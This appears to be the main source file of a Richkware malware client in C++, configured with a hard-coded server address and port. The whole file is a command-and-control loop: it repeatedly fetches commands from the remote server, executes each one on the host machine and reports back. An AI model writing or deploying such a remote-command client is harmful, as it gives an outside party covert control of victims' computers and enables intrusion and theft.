/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*      Created by bladez on 13/06/19.
*/

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    // with RichkwareManagerServer
    Richkware richkware("Richk","richktest","172.24.51.229", "8080", "er@fv.it");
    // without RichkwareManagerServer
    //Richkware richkware("Richk","richktest");

    // PUT YOUR CODE HERE
//    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
//    richkware.executeCommands();
    std::vector<std::string> commands = richkware.updateCommands("172.24.51.229", "8080", "");
    if (!commands.empty()) {
        for (size_t i = 0; i < commands.size(); ++i) {
            richkware.executeCommand(commands.at(i));
            commands = richkware.updateCommands("172.24.51.229", "8080", utils::concatVector(commands, "##"));
            commands.pop_back();
        }
    }
    return 0;

}


